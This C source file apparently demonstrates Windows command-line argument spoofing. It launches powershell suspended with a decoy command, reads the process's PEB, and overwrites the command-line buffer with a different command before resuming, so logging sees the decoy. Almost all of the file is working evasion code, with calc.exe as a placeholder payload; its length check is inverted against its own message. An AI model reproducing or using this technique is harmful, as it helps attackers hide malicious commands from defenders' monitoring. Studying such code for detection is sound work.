#include <Windows.h>
#include <winternl.h>
#include "misc.h"

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)
(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
	);

int main()
{
	BOOL bRet = FALSE;

	STARTUPINFOW Si = { 0 };
	PROCESS_INFORMATION Pi = { 0 };
	PROCESS_BASIC_INFORMATION PBI = { 0 };

	//RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	//RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	WCHAR szFakeCmd[] = L"powershell -c notepad.exe";
	WCHAR szRealCmd[] = L"powershell -c calc.exe";

	NTSTATUS lStatus = NULL;
	DWORD dwRet = NULL;

	PPEB pPeb = NULL;
	PRTL_USER_PROCESS_PARAMETERS pParameters = NULL;

	do {
		if (lstrlenW(szFakeCmd) < lstrlenW(szRealCmd))
		{
			wprintf(L"[!] fakeCmd needs to be shorter then realCmd\n");
			break;
		}

		wprintf(L"[i] Getting the address of the NtQueryInformationProcess function... ");
		fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
		if (pNtQueryInformationProcess == NULL)
		{
			printError(L"GetProcAddress");
			break;
		}
		wprintf(L"done, 0x%p\n", pNtQueryInformationProcess);

		wprintf(L"[i] Creating new process... ");
		bRet = CreateProcessW(
			NULL,
			szFakeCmd,
			NULL,
			NULL,
			FALSE,
			CREATE_SUSPENDED | CREATE_NO_WINDOW,
			NULL,
			L"C:\\Windows\\System32\\",
			&Si,
			&Pi);
		if (!bRet)
		{
			printError(L"CreateProcessW");
			break;
		}
		wprintf(L"done, PID: %d, ThreadId: %d\n", Pi.dwProcessId, Pi.dwThreadId);

		wprintf(L"[i] Getting the PROCESS_BASIC_INFORMATION structure of the remote process... ");
		lStatus = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), NULL);
		if (lStatus != 0)
		{
			printNtStatus(L"pNtQueryInformationProcess", lStatus);
			break;
		}
		wprintf(L"done\n");

		pPeb = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));

		wprintf(L"[i] Reading the PEB structure from remote process... ");
		bRet = ReadProcessMemory(Pi.hProcess, PBI.PebBaseAddress, pPeb, sizeof(PEB), NULL);
		if (!bRet)
		{
			printError(L"ReadProcessMemory");
			break;
		}
		wprintf(L"done\n");

		pParameters = (PRTL_USER_PROCESS_PARAMETERS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RTL_USER_PROCESS_PARAMETERS));

		wprintf(L"[i] Reading the RTL_USER_PROCESS_PARAMETERS structure... ");
		bRet = ReadProcessMemory(Pi.hProcess, pPeb->ProcessParameters, pParameters, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL);
		if (!bRet)
		{
			printError(L"ReadProcessMemory");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[i] Writing the realCmd to the process... ");
		bRet = WriteProcessMemory(Pi.hProcess, pParameters->CommandLine.Buffer, szRealCmd, lstrlenW(szRealCmd) * sizeof(WCHAR) + 1, NULL);
		if (!bRet)
		{
			printError(L"WriteProcessMemory");
			break;
		}
		wprintf(L"done\n");

		HeapFree(GetProcessHeap(), NULL, pPeb);
		HeapFree(GetProcessHeap(), NULL, pParameters);

		wprintf(L"[#] Hit a key to continue...");
		getchar();

		wprintf(L"[i] Resuming thread... ");
		dwRet = ResumeThread(Pi.hThread);
		if (!dwRet)
		{
			printError(L"ResumeThread");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[#] Hit a key to continue...");
		getchar();

	} while (FALSE);

	return 0;
}